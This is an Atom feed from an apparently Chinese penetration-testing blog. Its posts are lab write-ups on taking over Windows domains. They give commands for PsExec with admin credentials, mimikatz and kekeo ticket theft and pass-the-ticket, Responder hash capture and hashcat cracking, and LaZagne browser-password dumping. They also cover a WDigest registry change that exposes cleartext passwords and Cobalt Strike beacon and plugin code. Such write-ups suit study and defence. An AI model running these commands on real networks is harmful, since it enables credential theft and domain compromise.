<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sherlocz.github.io/"/>
  <updated>2020-12-21T07:27:23.101Z</updated>
  <id>http://sherlocz.github.io/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>how-psexec-works</title>
    <link href="http://sherlocz.github.io/2020/12/21/how-psexec-works/"/>
    <id>http://sherlocz.github.io/2020/12/21/how-psexec-works/</id>
    <published>2020-12-21T07:21:18.000Z</published>
    <updated>2020-12-21T07:27:23.101Z</updated>
    
    <content type="html"><![CDATA[<p>PsExec用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.1.1 -u administrator -p 123456 -s cmd</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;PsExec用法：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>约束委派攻击复现</title>
    <link href="http://sherlocz.github.io/2020/12/15/kerberos-constrained-delegation/"/>
    <id>http://sherlocz.github.io/2020/12/15/kerberos-constrained-delegation/</id>
    <published>2020-12-15T08:02:28.000Z</published>
    <updated>2020-12-16T09:40:48.958Z</updated>
    
    <content type="html"><![CDATA[<p>不清楚原理先来复现一下</p><p>测试环境如下：</p><ul><li>dc 192.168.43.100(域控)    administrator(域管)</li><li>Test08 192.168.43.110(域内机器) testuser(域内普通用户)</li><li>域 hacke.testlab</li></ul><h1 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h1><p>首先我们要设置test08机器有非约束委派的属性<br><img src="/2020/12/15/kerberos-constrained-delegation/test08.png" alt></p><p>我们可以使用powersploit中的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" title="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">脚本</a>来获取具有非约束委派的机器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1;</span><br><span class="line">Get-NetComputer -Unconstrained -Domain hacke.testlab</span><br></pre></td></tr></table></figure><p><img src="/2020/12/15/kerberos-constrained-delegation/powersploit.png" alt></p><p>使用域管账号访问Test08这台机器<br><img src="/2020/12/15/kerberos-constrained-delegation/dir1.png" alt></p><p>这个时候会在test08这台机器上的lsass.exe内存中留下留下票据信息</p><p>testuser用户登录test08这台机器，mimikatz导出票据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/admin.png" alt></p><p>这里可以看见有一个域管的票据，用mimikat导入进去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;1f78b6]-2-0-60a10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/import.png" alt></p><p>这个时候在同一cmd下发现可以访问dc了<br><img src="/2020/12/15/kerberos-constrained-delegation/dcc.png" alt></p><p>可以利用psexec直接cmd过去</p><p><img src="/2020/12/15/kerberos-constrained-delegation/ipconfig.png" alt></p><p>域控就拿下了</p><h1 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h1><p>首先要将域用户委派设置为域控的cifs<br>test= testuser，一个是名称一个是登录名，懒得改了<br><img src="/2020/12/15/kerberos-constrained-delegation/cifs.png" alt></p><p>将testuser用户设置成服务账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A SQLServer/test08.hacke.testlab/MSSQL testuser</span><br><span class="line">setspn -L testuser</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/service.png" alt></p><p>我们可以利用先前的powerview工具来查看域中的服务账号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;Get-DomainUser -TrustedToAuth -Domain hacke.testlab | select name</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/test.png" alt></p><p>利用<a href="https://github.com/gentilkiwi/kekeo" title="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">kekeo</a>工具生成票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:test /domain:hacke.testlab /password:xxxx</span><br><span class="line"></span><br><span class="line">tgs::s4u /tgt:TGT_testuser@HACKE.TESTLAB_krbtgt~hacke.testlab@HACKE.TESTLAB.kirbi /user:administrator@hacke.testlab /service:cifs/dc.hacke.testlab</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/kekeo.png" alt></p><p>mimikatz导入票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_administrator@hacke.testlab@HACKE.TESTLAB_testuser@HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/mimikatz.png" alt><br>可以访问dc了</p><p>不过这种方法有前提条件，就是服务账号cifs设置的是域控的地址</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不清楚原理先来复现一下&lt;/p&gt;
&lt;p&gt;测试环境如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dc 192.168.43.100(域控)    administrator(域管)&lt;/li&gt;
&lt;li&gt;Test08 192.168.43.110(域内机器) testuser(域内普通用户)&lt;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="http://sherlocz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Responder在渗透测试中的利用</title>
    <link href="http://sherlocz.github.io/2020/12/14/Responder-Pentest/"/>
    <id>http://sherlocz.github.io/2020/12/14/Responder-Pentest/</id>
    <published>2020-12-14T04:42:47.000Z</published>
    <updated>2020-12-14T08:53:32.429Z</updated>
    
    <content type="html"><![CDATA[<p>#基本使用#</p><p>Github:<br><a href="https://github.com/lgandx/Responder-Windows" target="_blank" rel="noopener">https://github.com/lgandx/Responder-Windows</a><br>Kali自带<br>启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/14/Responder-Pentest/start.png" alt><br>这里监听了这台kali，ip为192.168.43.105</p><p>使用域内其他机器访问kali的ipc，由于不存在，DNS解析不成功，回退到LLMNR和NBT-NS请求来解析目的地机器，这个时候responder会抓取到NTLMv2的hash</p><p><img src="/2020/12/14/Responder-Pentest/ipc.png" alt></p><p><img src="/2020/12/14/Responder-Pentest/hash.png" alt></p><p>抓取到的hash用<a href="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" title="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" target="_blank" rel="noopener">hashcat</a>解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/hashcat-6.1.1# ./hashcat.bin -m 5600 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>解出hash之后就可以用域用户登录了。<br><img src="/2020/12/14/Responder-Pentest/pass.png" alt></p><p>#钓鱼#<br>在Responder的配置文件中，我们可以找到html inject的相关信息<br><img src="/2020/12/14/Responder-Pentest/html.png" alt></p><p>将这个img标签新建到html中，访问<br><img src="/2020/12/14/Responder-Pentest/ip.png" alt></p><p>这里随意输入，然后点击确定，responder会接收到ntlm v2的hash<br><img src="/2020/12/14/Responder-Pentest/admin.png" alt></p><p>这里的hash并不是我们弹框输入的用户名密码的hash，而是对方机器的真实hash</p><p>#NTLMv2传递#<br>没复现成功<br>Waiting……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#基本使用#&lt;/p&gt;
&lt;p&gt;Github:&lt;br&gt;&lt;a href=&quot;https://github.com/lgandx/Responder-Windows&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/lgandx/R
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>读取CS的beacon配置文件</title>
    <link href="http://sherlocz.github.io/2020/12/03/cs-checksum8/"/>
    <id>http://sherlocz.github.io/2020/12/03/cs-checksum8/</id>
    <published>2020-12-03T09:42:37.000Z</published>
    <updated>2020-12-03T10:52:14.266Z</updated>
    
    <content type="html"><![CDATA[<p>nmap脚本在这里：<br><a href="https://github.com/whickey-r7/grab_beacon_config" target="_blank" rel="noopener">https://github.com/whickey-r7/grab_beacon_config</a></p><p>我们可以看见这个url后面拼接的加密方式、感觉就是返回了4位数的随机数<br><img src="/2020/12/03/cs-checksum8/nse.png" alt></p><p>写成python脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">def generate_checksum(input):</span><br><span class="line">trial = &quot;&quot;</span><br><span class="line">total = 0</span><br><span class="line">i = 1</span><br><span class="line">while total != input:</span><br><span class="line">total = 0</span><br><span class="line">trial = &apos;&apos;.join(random.choice(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;) for i in range(4))</span><br><span class="line">for i in range(4):</span><br><span class="line">total = (total + ord(trial[i])) % 256</span><br><span class="line">i = i + 1</span><br><span class="line">return trial</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">url_x86 = generate_checksum(92)</span><br><span class="line">print(url_x86)</span><br><span class="line">url_x64 = generate_checksum(93)</span><br><span class="line">print(url_x64)</span><br></pre></td></tr></table></figure></p><p>生成四位数的随机数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.75.170/KeVV</span><br></pre></td></tr></table></figure></p><p>可以下载下来beacon的配置文件，打开是二进制文件、网上找了几个cobaltstrikescan的脚本解析但是都没成功 ==</p><p>nmap脚本效果如下：<br><img src="/2020/12/03/cs-checksum8/nse.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;nmap脚本在这里：&lt;br&gt;&lt;a href=&quot;https://github.com/whickey-r7/grab_beacon_config&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/whickey-r7/gra
      
    
    </summary>
    
    
    
      <category term="CobaltStrike" scheme="http://sherlocz.github.io/tags/CobaltStrike/"/>
    
  </entry>
  
  <entry>
    <title>CS插件开发</title>
    <link href="http://sherlocz.github.io/2020/11/21/cna-code/"/>
    <id>http://sherlocz.github.io/2020/11/21/cna-code/</id>
    <published>2020-11-21T11:23:09.000Z</published>
    <updated>2020-11-29T12:13:16.625Z</updated>
    
    <content type="html"><![CDATA[<p>新建按钮：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom &#123;</span><br><span class="line">menu &quot;测试&quot; &#123;</span><br><span class="line">item &quot;测试1&quot; &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/11/21/cna-code/button.png" alt></p><p>控制台文本颜色：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alias showcolor&#123;</span><br><span class="line">blog($1,&quot;Hello \c0test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c1test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c2test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c3test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c4test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c5test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c6test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c7test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c8test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c9test&quot;);</span><br><span class="line">blog($1,&quot;Hello \cAtest&quot;);</span><br><span class="line">blog($1,&quot;Hello \cBtest&quot;);</span><br><span class="line">blog($1,&quot;Hello \cCtest&quot;);</span><br><span class="line">blog($1,&quot;Hello \cDtest&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/11/21/cna-code/color.png" alt></p><p>上传文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom &#123;</span><br><span class="line">menu &quot;测试&quot; &#123;</span><br><span class="line">item &quot;上传nbtscan&quot; &#123;</span><br><span class="line">$bid = $1;</span><br><span class="line">$dialog = dialog(&quot;上传nbtscan&quot;, %(UploadPath =&gt; &quot;C:\\Temp\\&quot;, bid =&gt; $bid), &amp;FRP);</span><br><span class="line">drow_text($dialog, &quot;UploadPath&quot;,  &quot;上传路径: &quot;); </span><br><span class="line">dbutton_action($dialog, &quot;上传&quot;);</span><br><span class="line">dialog_show($dialog);</span><br><span class="line">        &#125;</span><br><span class="line">        sub FRP &#123;</span><br><span class="line">    bcd($bid, $3[&apos;UploadPath&apos;]);</span><br><span class="line">    if (-is64 $bid[&apos;id&apos;]) &#123;</span><br><span class="line">        bupload($bid, script_resource(&quot;/japowriehfpao.exe&quot;));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        bupload($bid, script_resource(&quot;/japowriehfpao.exe&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/5887" title="https://xz.aliyun.com/t/5887" target="_blank" rel="noopener">CobaltStrike插件开发官方指南 Part1</a></p><p><a href="https://www.cobaltstrike.com/aggressor-script/functions.html" title="https://www.cobaltstrike.com/aggressor-script/functions.html" target="_blank" rel="noopener">Aggressor Script Tutorial and Reference</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;新建按钮：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br
      
    
    </summary>
    
    
    
      <category term="CS插件" scheme="http://sherlocz.github.io/tags/CS%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>lazagne-360</title>
    <link href="http://sherlocz.github.io/2020/11/15/lazagne-360/"/>
    <id>http://sherlocz.github.io/2020/11/15/lazagne-360/</id>
    <published>2020-11-15T06:03:37.000Z</published>
    <updated>2020-11-15T06:29:46.333Z</updated>
    
    <content type="html"><![CDATA[<p>其实三好学生之前写过自定义lazagne抓取不同浏览器密码：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/" title="https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/" target="_blank" rel="noopener">本地密码查看工具LaZagne中的自定义脚本开发</a></p><p>不过他这个版本很老了，又看见有师傅再问怎么抓取360极速浏览器的密码，之前也尝试过，简单做做笔记。</p><p>下载LaZagne:<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><p>我们这里就编译windows版本的，由于360极速浏览器也是用的chrome内核，其实我们只需要将浏览器保存密码的路径修改一下就行了。</p><p>修改LaZagne-master\Windows\lazagne\softwares\browsers\chromium_based.py中的225行数组，将下列代码添加到数组中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(u&apos;360CEC&apos;, u&apos;&#123;LOCALAPPDATA&#125;\\360Chrome\\Chrome\\User Data&apos;),</span><br></pre></td></tr></table></figure></p><p><img src="/2020/11/15/lazagne-360/change.png" alt><br>然后重新编译LaZagne：<a href="https://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/" title="https://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/">LaZagne编译抓取浏览器密码</a></p><p>效果如图：<br><img src="/2020/11/15/lazagne-360/success.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实三好学生之前写过自定义lazagne抓取不同浏览器密码：&lt;a href=&quot;https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9
      
    
    </summary>
    
    
    
      <category term="密码抓取" scheme="http://sherlocz.github.io/tags/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>SYSVOL</title>
    <link href="http://sherlocz.github.io/2020/11/08/SYSVOL-GPP/"/>
    <id>http://sherlocz.github.io/2020/11/08/SYSVOL-GPP/</id>
    <published>2020-11-08T07:59:21.000Z</published>
    <updated>2020-11-13T04:46:14.078Z</updated>
    
    <content type="html"><![CDATA[<p>SYSVOL目录为AD共享的文件夹，所有的域认证用户都可以读取，也包括组策略脚本，这个脚本中会泄露加密后的域内用户密码。</p><p>配置如下，更新下域管的密码：<br><img src="/2020/11/08/SYSVOL-GPP/setting.png" alt></p><p>这里我更新了域控密码之后，会在sysvol共享文件夹中创建group.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\ip\sysvol\域\Policies\&#123;xxxx&#125;\USER\Preferences\Groups.xml</span><br></pre></td></tr></table></figure></p><p>这个文件中会保存更新后加密的域管密码：<br><img src="/2020/11/08/SYSVOL-GPP/pass.png" alt></p><p>解密方式：<br><a href="Get-GPPPassword.ps1" title="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword.ps1</a></p><p><img src="/2020/11/08/SYSVOL-GPP/success.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;SYSVOL目录为AD共享的文件夹，所有的域认证用户都可以读取，也包括组策略脚本，这个脚本中会泄露加密后的域内用户密码。&lt;/p&gt;
&lt;p&gt;配置如下，更新下域管的密码：&lt;br&gt;&lt;img src=&quot;/2020/11/08/SYSVOL-GPP/setting.png&quot; alt&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>KB2871997无法抓取明文密码</title>
    <link href="http://sherlocz.github.io/2020/11/02/KB2871997/"/>
    <id>http://sherlocz.github.io/2020/11/02/KB2871997/</id>
    <published>2020-11-02T14:06:53.000Z</published>
    <updated>2020-11-02T15:07:38.931Z</updated>
    
    <content type="html"><![CDATA[<p>前几天在项目中发现利用mimiakatz无法抓取明文密码，hash又解不出来，pth过去也不行，后来查了资料后发现是打了补丁(<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" title="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" target="_blank" rel="noopener">KB2871997</a>)的原因。</p><p><img src="/2020/11/02/KB2871997/freebuf.png" alt></p><h1 id="补丁安装"><a href="#补丁安装" class="headerlink" title="补丁安装"></a>补丁安装</h1><p><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" title="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" target="_blank" rel="noopener">KB2871997</a></p><p>安装好之后运行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p><p>重启计算机，再次利用mimikatz抓取密码:<br><img src="/2020/11/02/KB2871997/reboot.png" alt></p><p>这个时候我们发现只有hash没有明文了，freebuf里说的mimikatz不管用了==</p><h1 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure><p>可以将我们之前的 UseLogonCredential 设置成 1，然后注销计算机，等待管理员重新登录就可以抓取明文密码<br>锁屏命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure></p><p>也可以直接使用三好学生的ps脚本：<br><a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed" target="_blank" rel="noopener">https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed</a></p><p>效果如下：<br><img src="/2020/11/02/KB2871997/got.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前几天在项目中发现利用mimiakatz无法抓取明文密码，hash又解不出来，pth过去也不行，后来查了资料后发现是打了补丁(&lt;a href=&quot;https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997&quot;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>exchange安装</title>
    <link href="http://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/"/>
    <id>http://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/</id>
    <published>2020-10-30T07:56:13.000Z</published>
    <updated>2020-10-30T08:12:01.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p><a href="https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2019#windows-server-2019-prerequisites-for-exchange-2019" title="https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2019#windows-server-2019-prerequisites-for-exchange-2019" target="_blank" rel="noopener">官网安装教程及要求</a></p><p>不过比较繁琐，看不懂Emmmm</p><p>Windows Server 2012：<a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></p><p>虚拟机内存给4G，给少了安装之后会很卡</p><p>安装好之后，运行powershell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-WindowsFeature Server-Media-Foundation, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS</span><br></pre></td></tr></table></figure></p><p>然后需要安装几个组件</p><p><a href="https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe" title="https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe" target="_blank" rel="noopener">.NET Framework 4.8</a></p><p><a href="https://www.microsoft.com/download/details.aspx?id=30679" title="https://www.microsoft.com/download/details.aspx?id=30679" target="_blank" rel="noopener">Visual C++ Redistributable Package for Visual Studio 2012</a></p><p><a href="https://support.microsoft.com/help/4032938/update-for-visual-c-2013-redistributable-package" title="https://support.microsoft.com/help/4032938/update-for-visual-c-2013-redistributable-package" target="_blank" rel="noopener">Visual C++ Redistributable Package for Visual Studio 2013</a></p><p><a href="https://download.microsoft.com/download/2/C/4/2C47A5C1-A1F3-4843-B9FE-84C0032C61EC/UcmaRuntimeSetup.exe" title="https://download.microsoft.com/download/2/C/4/2C47A5C1-A1F3-4843-B9FE-84C0032C61EC/UcmaRuntimeSetup.exe" target="_blank" rel="noopener">UcmaRuntimeSetup</a></p><p>安装好之后将这台12机器加域，用域管理(administrator)用户登录</p><p>下载Exchange Server : <a href="https://docs.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</a></p><p>我这里安装Exchange Server 2016 CU17</p><p>下载好之后复制到虚拟机中，右键挂载，运行setup</p><p>这个时候安装界面应该就好了，然后安装（估计要1-2h）</p><p>安装好之后访问:<a href="https://localhost/owa" target="_blank" rel="noopener">https://localhost/owa</a></p><p>这里登录administrator</p><p><img src="/2020/10/30/how-to-install-exchange-server/success.png" alt></p><p>装了好几天终于装好了  ==</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/pre
      
    
    </summary>
    
    
    
      <category term="环境搭建" scheme="http://sherlocz.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>基于kerberos协议的域内用户名密码爆破</title>
    <link href="http://sherlocz.github.io/2020/10/26/kerberos-brute/"/>
    <id>http://sherlocz.github.io/2020/10/26/kerberos-brute/</id>
    <published>2020-10-26T06:41:54.000Z</published>
